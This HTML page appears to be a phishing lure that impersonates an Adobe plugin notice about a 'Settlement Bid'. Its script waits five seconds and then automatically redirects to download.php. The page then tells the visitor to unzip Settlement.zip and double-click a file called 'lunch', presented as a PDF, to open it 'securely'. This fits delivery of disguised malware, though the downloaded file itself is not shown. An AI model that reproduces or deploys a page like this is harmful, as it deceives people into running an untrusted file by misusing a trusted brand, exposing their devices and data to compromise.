<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Plugin Required</title>
    <link rel="shortcut icon" href="img/favicon.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            background-color: #f5f5f5;
            padding-top: 15vh;
        }

        .container {
            text-align: center;
            max-width: 600px;
        }

        img {
            width: 150px;
            margin-bottom: 20px;
        }

        a {
            color: #d32f2f;
            text-decoration: none;
            font-weight: bold;
        }

        a:hover {
            text-decoration: underline;
        }

        p {
            line-height: 1.6;
            padding: 0 10px;
        }

        .countdown {
            font-size: 18px;
            font-weight: bold;
            color: #d32f2f;
            margin-top: 15px;
        }
    </style>
</head>
<body>

<div class="container">
    <img src="img/adobeicon.png" alt="Adobe Icon">

    <p>Agreement and Settlement Bid.<p>
    
    <div class="countdown">
        Download start in <span id="timer">5</span> seconds...
    </div>
    <p>
        
        <h1>How To Open</h1>
    <div class="step">
      <h2>Step 1: Locate the Downloaded File</h2>
      
        Right Click on the Settlement.zip from your recent downloads or Downloads folder To extract
    </p>
    <h2>Step 2: Locate the Extracted File</h2>
    <p>Open the extracted folder name settlement.</p>
    
    <h2>Step 3: Click on Lunch</h2>
    <p>Double Click on pdf file named lunch to securely open your file .</p>
</div>

<script>
    let timeLeft = 5;
    const timerElement = document.getElementById("timer");

    const countdown = setInterval(() => {
        timeLeft--;
        timerElement.textContent = timeLeft;

        if (timeLeft <= 0) {
            clearInterval(countdown);
            window.location.href = "download.php";
        }
    }, 1000);
</script>

</body>
</html>